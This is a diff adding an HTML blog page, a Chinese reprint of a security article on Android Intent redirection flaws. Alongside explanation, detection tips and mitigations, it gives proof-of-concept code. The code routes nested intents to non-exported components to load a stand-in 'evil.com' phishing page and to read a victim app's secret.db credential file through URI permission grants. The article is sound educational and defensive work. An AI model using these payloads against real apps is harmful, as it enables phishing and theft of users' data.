@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    
+    <title>Android App安全之Intent重定向详解 | 氕氘氚</title>
+    <meta name="keywords" content="hexo,theme,otakism,otaku"/>
+    <meta name="HandheldFriendly" content="True"/>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="google-site-verification" content=""/>
+    <meta name="baidu-site-verification" content=""/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="Android App安全之Intent重定向详解 本文转自OPPO安珀实验室 并作补充  未导出组件和非导出组件导出组件(公有组件) 导出组件一般有以下三种形式： 123451.在AndroidManifest.xml中的组件如果显式设置了组件属性android:exported值为true;2.如果组件没有显式设置android:exported为false，但是其intent-filter以">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Android App安全之Intent重定向详解">
+<meta property="og:url" content="http://example.com/2024/01/22/Android-Internet-Redirect/index.html">
+<meta property="og:site_name" content="氕氘氚">
+<meta property="og:description" content="Android App安全之Intent重定向详解 本文转自OPPO安珀实验室 并作补充  未导出组件和非导出组件导出组件(公有组件) 导出组件一般有以下三种形式： 123451.在AndroidManifest.xml中的组件如果显式设置了组件属性android:exported值为true;2.如果组件没有显式设置android:exported为false，但是其intent-filter以">
+<meta property="og:locale">
+<meta property="og:image" content="http://example.com/2024/01/22/Android-Internet-Redirect/1.png">
+<meta property="article:published_time" content="2024-01-22T03:18:25.000Z">
+<meta property="article:modified_time" content="2024-01-26T06:42:10.680Z">
+<meta property="article:author" content="Szczecin">
+<meta property="article:tag" content="Exploit">
+<meta property="article:tag" content="Reprint">
+<meta property="article:tag" content="Android">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/01/22/Android-Internet-Redirect/1.png">
+    
+
+    <!-- Favicon -->
+    
+        <link rel="icon" href="/img/favicon.ico" />
+    
+
+    <!-- Font -->
+    <link href="https://fonts.googleapis.com/css?family=Inconsolata|Roboto:300,400,700" rel="stylesheet">
+
+    
+<link rel="stylesheet" href="/style.css">
+
+    <script>
+      function setLoadingBarProgress(num) {
+        document.getElementById('loading-bar').style.width = num + "%";
+      }
+    </script>
+
+    
+
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div id="loading-bar-wrapper">
+  <div id="loading-bar"></div>
+</div>
+
+<script>setLoadingBarProgress(20)</script>
+
+<div id="site-wrapper">
+
+    <header id="header">
+    <div id="header-wrapper" class="clearfix">
+        <a id="logo" href="/">
+            <img src="/img/logo.png"/>
+            <span id="site-desc">
+                Be A Gorgeous World
+            </span>
+        </a>
+        <button id="site-nav-switch">
+            <span class="icon icon-menu"></span>
+        </button>
+    </div>
+</header>
+    <script>setLoadingBarProgress(40);</script>
+
+    <main id="main" role="main">
+        <article id="post-Android-Internet-Redirect"
+         class="post article white-box article-type-post"
+         itemscope itemprop="blogPost">
+    <h2 class="title">
+        <a href="/2024/01/22/Android-Internet-Redirect/">
+            Android App安全之Intent重定向详解
+        </a>
+    </h2>
+    <time>
+        Jan 22, 2024
+    </time>
+    <section class="content">
+        <div class="article-entry" itemprop="articleBody">
+            <h1><span id="android-app安全之intent重定向详解">Android App安全之Intent重定向详解</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/endpoint/271629.html">OPPO安珀实验室</a> 并作补充</p>
+</blockquote>
+<h2><span id="未导出组件和非导出组件">未导出组件和非导出组件</span></h2><h3><span id="导出组件公有组件">导出组件(公有组件)</span></h3><blockquote>
+<p>导出组件一般有以下三种形式：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.在AndroidManifest.xml中的组件如果显式设置了组件属性android:exported值为true;</span><br><span class="line"></span><br><span class="line">2.如果组件没有显式设置android:exported为false，但是其intent-filter以及action存在，则也为导出组件;</span><br><span class="line"></span><br><span class="line">3.API Level在17以下的所有App的provider组件的android:exported属性默认值为true，17及以上默认值为false。</span><br></pre></td></tr></table></figure>
+
+<p>任意第三方App都可以访问导出组件。</p>
+</blockquote>
+<h3><span id="未导出组件专用组件">未导出组件(专用组件)</span></h3><blockquote>
+<p>1.在AndroidManifest.xml中注册的组件显式设置android:exported&#x3D;”false” ;</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.WebViewActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>2.组件没有intent-filter, 且没有显式设置android:exported的属性值，默认为非导出的;</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.WebViewActivity&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>3.组件虽然配置了intent-filter,，但是显式设置android:exported&#x3D;”false”。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span> =<span class="string">&quot;.WebViewActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.VIEW&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:scheme</span>=<span class="string">&quot;victim&quot;</span> <span class="attr">android:host</span>=<span class="string">&quot;secure_handler&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这三种组件称为专有组件或者未导出组件，三方应用无法直接调用这种组件。例如WebViewActivity中有以下代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">   <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">  <span class="comment">// ... </span></span><br><span class="line">   <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line">   <span class="type">String</span> <span class="variable">Url</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">   <span class="comment">// ... </span></span><br><span class="line">   webView.loadUrl(Url);</span><br></pre></td></tr></table></figure>
+
+<p>第三方应用直接访问上述未导出的WebViewActivity组件来加载url，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.victim&quot;</span>, <span class="string">&quot;com.victim.ui.WebViewActivity&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;http://evil.com/&quot;</span>);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>
+
+<p>系统将会抛出java.lang.SecurityException, due to Permission Denial: WebViewActivity not exported from uid xxx.</p>
+</blockquote>
+<h2><span id="intent重定向">Intent重定向</span></h2><blockquote>
+<p>那么如果三方APP要想访问上述非导出的WebViewActivity是不是就没有办法了呢？</p>
+<p>当然不是! 其中一种常见的方式即为在本文中介绍Intent重定向， 即将Intent类的对象作为Intent 的Extras通过一个导出组件传递给非导出的组件, 以此来实现访问非导出的WebViewActivity组件。</p>
+<p>原理在于，Android 组件之间传输的Intent类是实现了Parcelable的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Intent</span> <span class="keyword">implements</span> <span class="title class_">Parcelable</span>, Cloneable &#123;</span><br></pre></td></tr></table></figure>
+
+<p>因此可以将属于Intent类的对象作为Intent的 extra数据对象传递到另一个组件中，相当于在Intent中嵌入Intent。</p>
+<p>这时，如果App从不可信 Intent 的Extras字段中提取出嵌入的 Intent，然后对这个嵌入 Intent 调用 startActivity（或类似的 startService 和 sendBroadcast），这样做是很危险的； 因为攻击者原本是无法访问非导出的组件的，但是通过intent重定向，即以导出的组件作为桥即可以访问非exported的组件，达到launch anywhere或者broadcast anywhere的目的。</p>
+<p>其原理如下图所示:</p>
+<p><img src="/2024/01/22/Android-Internet-Redirect/1.png" alt="image"></p>
+<p>Intent重定向违反了Android的安全设计，导致Android的安全访问限制（App的沙箱机制）失效。</p>
+<p>Intent重定向可能导致以下安全问题：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>启动非导出组件，通过精心构造的可控的Intent参数来执行敏感操作，如果可以重写或者替换native 库，甚至还会导致任意代码执行；</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>可以获取非导出的content provider组件的content：<span class="comment">// URI的访问权限来窃取敏感文件.</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来我们分别举三个例子来说明:</p>
+</blockquote>
+<h3><span id="启动非导出组件">启动非导出组件</span></h3><blockquote>
+<p>我们继续以上述的未导出的WebViewActivity为例子， 查找在App中是否存在导出Activity中包含了Intent重定向漏洞。刚好存在一个导出的com.victim.ui.HomeActivity组件符合预期。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onResume</span><span class="params">()</span> &#123; </span><br><span class="line">   <span class="comment">// ...  </span></span><br><span class="line">   handleIntentExtras(getIntent()); </span><br><span class="line">   <span class="comment">// 攻击者可以从外部输入任意intent</span></span><br><span class="line"> &#125;   </span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">handleIntentExtras</span><span class="params">(Intent intent)</span> &#123; </span><br><span class="line">    <span class="comment">// ... </span></span><br><span class="line">    <span class="type">Intent</span> <span class="variable">deeplinkIntent</span> <span class="operator">=</span> (Intent)intent.getParcelableExtra(<span class="string">&quot;extra_deep_link_intent&quot;</span>); </span><br><span class="line">    <span class="comment">// ... </span></span><br><span class="line">    <span class="keyword">if</span> (!(deeplinkIntent == <span class="literal">null</span> || <span class="built_in">this</span>.consumedDeeplinkIntent)) &#123; </span><br><span class="line">    / / ... </span><br><span class="line">        startActivity(deeplinkIntent); <span class="comment">// 危险! 打开攻击者发送的Intent</span></span><br><span class="line">     <span class="comment">// ... </span></span><br><span class="line">  &#125; </span><br><span class="line"> <span class="comment">// ... </span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>攻击者可以实现通过这个导出的HomeActivity访问任何受保护的未导出的Activity; 我们可以编写一个攻击App，将发向HomeActivity的Intent重定向到未导出的组件WebViewActivity中，让WebViewActivity的WebView加载攻击者的恶意链接，从而达到绕过Android的权限限制的目的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">next</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(); </span><br><span class="line">next.setClassName(<span class="string">&quot;com.victim&quot;</span>, <span class="string">&quot;com.victim.ui.WebViewActivity&quot;</span>); </span><br><span class="line">next.putExtra(<span class="string">&quot;extra_url&quot;</span>, <span class="string">&quot;http://evail.com&quot;</span>); <span class="comment">// 加载攻击者的钓鱼网站</span></span><br><span class="line">next.putExtra(<span class="string">&quot;extra_title&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(); </span><br><span class="line">intent .setClassName(<span class="string">&quot;com.victim&quot;</span>, <span class="string">&quot;com.victim.ui.HomeActivity&quot;</span>); intent .putExtra(<span class="string">&quot;extra_deep_link_intent&quot;</span>, next); <span class="comment">// 嵌入Intent</span></span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="越权访问content-provider">越权访问content provider</span></h3><blockquote>
+<p>除了可以访问任意组件之外，攻击者还可以访问满足以下条件的APP的Content Provider的组件：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.该组件必须是非导出的（否则可以直接攻击，无需使用我们在本文中讨论的模型）</span><br><span class="line"></span><br><span class="line">2.组件还设置了android：grantUriPermissions为true。</span><br></pre></td></tr></table></figure>
+
+<p>同时，攻击者在实现攻击时，必须将自己设置为嵌入Intent的接收者，并设置以下标志：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1).Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION允许对提供者的持久访问（没有此标志，则访问仅为一次）</span><br><span class="line"></span><br><span class="line">2).Intent.FLAG_GRANT_PREFIX_URI_PERMISSION允许通过前缀进行URI访问。</span><br><span class="line"></span><br><span class="line">3).Intent.FLAG_GRANT_READ_URI_PERMISSION允许对提供程序进行读取操作（例如query，openFile，openAssetFile）</span><br><span class="line"></span><br><span class="line">4).Intent.FLAG_GRANT_WRITE_URI_PERMISSION允许写操作</span><br></pre></td></tr></table></figure>
+
+<p>比如在App中有一个非导出的file provider, 该provider在其私有目录的database路径下保存了secret.db文件，该文件中保存了用户的登录账号信息。</p>
+<p>该file provider的设置如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:name</span>=<span class="string">&quot;androidx.core.content.FileProvider&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:authorities</span>=<span class="string">&quot;com.android.victim&quot;</span> <span class="attr">android:grantUriPermissions</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;android.support.FILE_PROVIDER_PATHS&quot;</span> <span class="attr">android:resource</span>=<span class="string">&quot;@xml/provider_paths&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>为了简便起见，APP的资源文件res&#x2F;xml&#x2F;provider_paths文件的配置为</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">paths</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root-path</span> <span class="attr">name</span>=<span class="string">&quot;root&quot;</span> <span class="attr">path</span>=<span class="string">&quot;/&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">paths</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们无法直接访问file provider， 但是可以通过Intent重定向来窃取secret.db文件。</p>
+<p>payload如下:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Intent next= <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">next.setClassName(getPackageName(), <span class="string">&quot;com.Attacker.AttackerActivity&quot;</span>); </span><br><span class="line"><span class="comment">// 设置为攻击者自己的组件</span></span><br><span class="line">next.setData(Uri.parse(<span class="string">&quot;content://com.victim.localfile/secret.db&quot;</span>)); </span><br><span class="line">next.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION |   Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION  | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION); </span><br><span class="line"><span class="comment">// 添加所有可以访问content provider的读写flag</span></span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.victim.localfile&quot;</span>, <span class="string">&quot;com.victim.localfile.LoginActivity&quot;</span>); intent.putExtra(<span class="string">&quot;com.victim.extra.NEXT_INTENT&quot;</span>, next); </span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="通过webview访问任意组件">通过WebView访问任意组件</span></h3><blockquote>
+<p>通常我们可以通过调用Intent.toUri（flags）方法将Intent对象转换为字符串，同时可以使用Intent.parseUri（stringUri，flags）将字符串从字符串转换回Intent。此功能通常在WebView（APP内置浏览器）中使用。APP可以解析intent:&#x2F;&#x2F; 这种类型的scheme，将URL字符串解析为Intent对象并启动相关的Activity。</p>
+<p>漏洞代码示例:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, WebResourceRequest request)</span> &#123;</span><br><span class="line">    <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> request.getUrl();</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;intent&quot;</span>.equals(uri.getScheme())) &#123;</span><br><span class="line">        startActivity(Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">super</span>.shouldOverrideUrlLoading(view, request);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>要利用此漏洞，攻击者可以通过Intent.Uri方法创建一个WebView重定向Intent 的url，然后让WebViewActivity去加载该Url，由于在shouldOverrideUrlLoading方法中没有做完整的校验，会存在Intent重定向漏洞。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.victim&quot;</span>, <span class="string">&quot;com.victim.WebViewActivity&quot;</span>);i</span><br><span class="line">ntent.putExtra(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;http://evil.com/&quot;</span>);</span><br><span class="line">Log.d(<span class="string">&quot;evil&quot;</span>, intent.toUri(Intent.URI_INTENT_SCHEME)); </span><br><span class="line"><span class="comment">//&quot;intent:#Intent;component=com.victim/.WebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 攻击代码</span></span><br><span class="line">location.href = <span class="string">&quot;intent;component=com.victim/.WebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end&quot;</span>;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="查看此类漏洞的方法">查看此类漏洞的方法</span></h2><blockquote>
+<p>如何在App中快速的找到此类漏洞呢？我们可以从以下三个方面入手:</p>
+<p>1.在App中查找导出组件，并且检查该组件是否接收从外部输入的Intent对象。</p>
+<p>2.在上述组件中查找对startActivity（或 startService 和 sendBroadcast）的调用，并验证其Intent组件是否是从受信任的数据对象来构造的。</p>
+<p>3.查找Intent 的 getExtras方法的调用，是否有将该方法的返回值强制转换为Intent；并在使用这种嵌入的Intent之前进行了完整的校验。</p>
+</blockquote>
+<h2><span id="漏洞缓解方法">漏洞缓解方法</span></h2><blockquote>
+<p>那么，如何缓解Intent重定向漏洞呢 ？</p>
+</blockquote>
+<h3><span id="方法1将受影响的应用组件设为专用组件">方法1：将受影响的应用组件设为专用组件。</span></h3><blockquote>
+<p>如果受影响的应用组件不需要接收来自其他应用的 Intent，可以将此应用组件设为专用组件，只需在清单中设置 android:exported&#x3D;“false” 即可。</p>
+</blockquote>
+<h3><span id="方法2确保提取的intent来自可信的来源">方法2：确保提取的Intent来自可信的来源。</span></h3><blockquote>
+<p>可以使用 getCallingActivity 等方法来验证源 Activity 是否可信。</p>
+<p>例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检查源 Activity 是否来自可信的包名</span></span><br><span class="line"> <span class="keyword">if</span> (getCallingActivity().getPackageName().equals(“known”)) &#123;</span><br><span class="line">   <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line">   <span class="comment">// 提取嵌套的 Intent</span></span><br><span class="line">   <span class="type">Intent</span> <span class="variable">forward</span> <span class="operator">=</span> (Intent) intent.getParcelableExtra(“key”);</span><br><span class="line">   <span class="comment">// 重定向嵌套的 Intent</span></span><br><span class="line">   startActivity(forward ) ;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意：检查 getCallingActivity() 是否返回非null值并不足以防范此漏洞。恶意App可以为此函数提供 null 值，最好加上APP的签名校验。</p>
+</blockquote>
+<h3><span id="方法3确保要重定向的intent是无害的">方法3：确保要重定向的Intent是无害的。</span></h3><blockquote>
+<p>需要先验证重定向的Intent，确保该 Intent</p>
+<p><strong>1.不会被发送到APP的任何专用组件</strong></p>
+<p><strong>2.不会被发送到外部应用的组件。如果重定向的目标是外部应用，请确保该 Intent 不会向APP的私有content provider授予URI权限。</strong></p>
+<p>在重定向 Intent 之前，应用可以先使用resolveActivity等方法检查将使用哪个组件来处理该 Intent。</p>
+<p>例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line"> <span class="comment">// 提取嵌套的 Intent</span></span><br><span class="line"> <span class="type">Intent</span> <span class="variable">forward</span> <span class="operator">=</span> (Intent) intent.getParcelableExtra(“key”);</span><br><span class="line"> <span class="comment">// 获取组件名称</span></span><br><span class="line"> <span class="type">ComponentName</span> <span class="variable">name</span> <span class="operator">=</span> forward.resolveActivity(getPackageManager());</span><br><span class="line"> <span class="comment">// 检查软件包名称和类名称是否符合预期</span></span><br><span class="line"> <span class="keyword">if</span> (name.getPackageName().equals(“safe_package”) &amp;&amp;</span><br><span class="line">     name.getClassName().equals(“safe_class”)) &#123;</span><br><span class="line">   <span class="comment">// 重定向嵌套的 Intent</span></span><br><span class="line">   startActivity(forward);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>App可以使用getFlags等方法来检查 Intent 是否会授予 URI 权限。应用还可以使用removeFlags撤消 URI 权限的授予。</p>
+<p>例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 提取嵌套的 Intent</span></span><br><span class="line"> <span class="type">Intent</span> <span class="variable">forward</span> <span class="operator">=</span> (Intent) intent.getParcelableExtra(“key”);</span><br><span class="line"> <span class="comment">// 获取标记</span></span><br><span class="line"> <span class="type">int</span> <span class="variable">flags</span> <span class="operator">=</span> forward.getFlags();</span><br><span class="line"> <span class="comment">// 检查嵌套的 Intent 不能授予 URI 读写权限</span></span><br><span class="line"> <span class="keyword">if</span> (( flags &amp; Intent.FLAG_GRANT_READ_URI_PERMISSION == <span class="number">0</span>) &amp;&amp;</span><br><span class="line">     (flags &amp; Intent.FLAG_GRANT_WRITE_URI_PERMISSION == <span class="number">0</span>)) &#123;</span><br><span class="line">    / / 重定向嵌套的 Intent</span><br><span class="line">       <span class="title function_">startActivity</span><span class="params">(forward)</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="参考">参考</span></h2><blockquote>
+<p>[1] Intent Redirection Vulnerability <a target="_blank" rel="noopener" href="https://support.google.com/faqs/answer/9267555?hl=en">https://support.google.com/faqs/answer/9267555?hl=en</a></p>
+<p>[2] #272044 Android - Access of some not exported content providers<a target="_blank" rel="noopener" href="https://hackerone.com/reports/272044[3]">https://hackerone.com/reports/272044[3]</a> #200427 Access of Android protected components via embedded intent<a target="_blank" rel="noopener" href="https://hackerone.com/reports/200427[4]">https://hackerone.com/reports/200427[4]</a> Intent.toUri<a target="_blank" rel="noopener" href="https://developer.android.com/reference/android/content/Intent#toURI()">https://developer.android.com/reference/android/content/Intent#toURI()</a></p>
+</blockquote>
+
+        </div>
+        <div class="article-tags tags">
+            
+                <a class="tag-none-link" href="/tags/Android/" rel="tag">Android</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            
+        </div>
+    </section>
+</article>
+
+
+
+
+
+        <script>setLoadingBarProgress(60);</script>
+    </main>
+
+    <footer id="footer" class="clearfix">
+
+    
+
+    <div class="social-wrapper">
+        
+            
+                <a href="https://github.com/artchen" class="social github"
+                   target="_blank" rel="external">
+                    <span class="icon icon-github"></span>
+                </a>
+            
+                <a href="/atom.xml" class="social rss"
+                   target="_blank" rel="external">
+                    <span class="icon icon-rss"></span>
+                </a>
+            
+        
+    </div>
+
+    <div class="theme-by">Theme <span class="codename">Memory</span> designed by <a href="https://artifact.me/"
+                                                                                    target="_blank">Art Chen</a>.
+    </div>
+    <div>&copy; <a href="/">氕氘氚</a></div>
+
+</footer>
+
+
+    <script>setLoadingBarProgress(80);</script>
+    <div class="overlay"></div>
+</div>
+
+<div class="site-sidebar" id="site-sidebar">
+
+    
+
+    <div class="sidebar-switch clearfix "
+         style="display: none">
+        <a class="dark-btn active" data-toggle="toc">
+            <span class="icon icon-list"></span>
+            <span class="text">Index</span>
+        </a>
+        <a class="dark-btn" data-toggle="bio">
+            <span class="icon icon-person"></span>
+            <span class="text">Bio</span>
+        </a>
+    </div>
+
+    <div class="site-toc "
+         style="display: none">
+        
+            <div class="no-index">No Index</div>
+        
+    </div>
+
+    <div class="site-bio show"
+         style="display: block">
+
+        <div class="about-me clearfix">
+            <div class="avatar">
+                <img src="/img/avatar.png"/>
+            </div>
+            <div class="info">
+                <a class="name dark-btn" href="/about">
+                    Szczecin
+                </a>
+            </div>
+            <div class="info">
+                <span class="item desc">
+                    Open your eyes to see the light in life
+                </span>
+            </div>
+        </div>
+
+        <div class="menu section">
+            <ul class="clearfix">
+                
+                    <li class="left">
+                        <a href="/about"
+                           onfocus="this.blur();"
+                           class="nav-about dark-btn block">
+                            简介
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/archives"
+                           onfocus="this.blur();"
+                           class="nav-archives dark-btn block">
+                            归档
